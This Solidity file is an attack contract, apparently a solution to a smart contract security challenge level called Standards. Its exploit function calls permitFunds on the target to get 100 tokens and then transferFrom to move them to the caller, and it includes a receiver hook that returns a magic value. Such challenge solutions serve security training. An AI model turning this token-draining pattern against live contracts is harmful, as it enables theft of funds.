// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import '../levels/Standards.sol';

contract StandardsAttack {
    uint256 value = 100 * 10**18;

  function exploit(address target) public {
    Standards standards = Standards(target);
    require(standards.permitFunds(value), "Failed to obtain tokens."); // obtain 100 tokens
    require(standards.transferFrom(target, msg.sender, value), "Failed to transfer tokens.");
  }

  function onERC20Received() external returns (uint256) {
      return 519725;
  }
}